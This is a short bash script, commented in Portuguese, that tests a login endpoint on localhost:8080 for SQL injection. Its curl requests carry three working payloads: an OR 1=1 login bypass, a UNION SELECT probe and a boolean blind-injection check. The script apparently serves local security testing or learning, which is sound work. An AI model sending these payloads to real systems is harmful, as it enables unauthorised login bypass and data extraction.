#!/bin/bash

# Testes básicos de SQL Injection
SERVIDOR="http://localhost:8080"

echo "Testing basic SQLi:"
curl -s "${SERVIDOR}?user=' OR 1=1 -- &pass=any" | grep "Login"

echo -e "\nTesting UNION attack:"
curl -s "${SERVIDOR}?user=' UNION SELECT 1,2,3 -- &pass=any" | grep -E "1|2|3"

echo -e "\nTesting blind injection:"
curl -s "${SERVIDOR}?user=admin' AND 1=1 -- &pass=any" | grep "Login"
